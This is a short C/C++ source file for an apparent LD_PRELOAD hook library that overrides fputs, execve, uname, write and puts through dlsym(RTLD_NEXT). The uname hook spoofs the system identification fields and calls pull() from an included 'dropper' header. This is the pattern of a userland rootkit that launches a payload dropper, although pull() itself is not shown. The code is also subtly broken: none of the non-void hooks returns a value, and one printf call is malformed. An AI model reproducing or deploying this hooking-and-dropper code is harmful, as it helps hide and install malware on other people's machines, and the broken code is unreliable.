#include "libhook.h"
#include "dropper.h"

int fputs(const char *s, FILE *stream)
{
	printf("[FPUTS HOOK TRIGGERED]");
	printf("\n");

	real_fputs = (fputs_type)dlsym(RTLD_NEXT, "fputs");
	real_fputs(s, stream);
}

int execve(const char* filename, char *const argv[], char *const env[])
{
	printf("[EXECVE HOOK TRIGGERED]");
	printf("\n");

	real_execve = (execve_type)dlsym(RTLD_NEXT, "execve");
	real_execve(filename, argv, env);
}

int uname(struct utsname* info)
{
	real_uname = (uname_type)dlsym(RTLD_NEXT, "uname");

	printf("[UNAME HOOK TRIGGERED]");
	printf("\n");

	real_uname(info);

	std::strcpy(info->sysname, "SYSNAME");
	std::strcpy(info->nodename, "NODE");
	std::strcpy(info->release, "RELEASE");
	std::strcpy(info->version, "VERSION");
	std::strcpy(info->machine, "MACHINE");
	std::strcpy(info->domainname, "DOMAINNAME");

	pull();
}

ssize_t write(int fd, const void *buf, size_t count)
{	
	printf("[WRITE HOOK TRIGGERED]", count);

	real_write = (write_type)dlsym(RTLD_NEXT, "write");
	real_write(fd, buf, count);	
}

int puts(const char* str)
{
	printf("[PUTS HOOK TRIGGERED]");
	printf("\n");

    real_puts = (puts_type)dlsym(RTLD_NEXT, "puts");
    real_puts(str);
}
